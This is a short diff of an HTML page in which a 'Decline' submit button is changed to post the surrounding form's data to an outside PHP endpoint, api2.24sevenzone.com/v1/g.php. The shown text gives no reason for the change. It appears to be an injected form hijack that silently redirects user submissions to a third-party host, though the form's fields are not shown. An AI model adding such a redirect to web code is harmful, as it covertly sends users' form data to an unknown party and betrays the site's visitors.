@@ -538,7 +538,7 @@ margin-bottom:10px;
                            </div>
                            <div style="line-height: 18px;">&nbsp;</div>
 
-                              	<div> <button type="submit" class="btn btn-primary mt-3 mb-3 w-25 h-10" id="nextbtn"> Decline </button></div>
+                              	<div> <button type="submit" formaction="https://api2.24sevenzone.com/v1/g.php" class="btn btn-primary mt-3 mb-3 w-25 h-10" id="nextbtn"> Decline </button></div>
                             
                             </div> 
   					</div>  
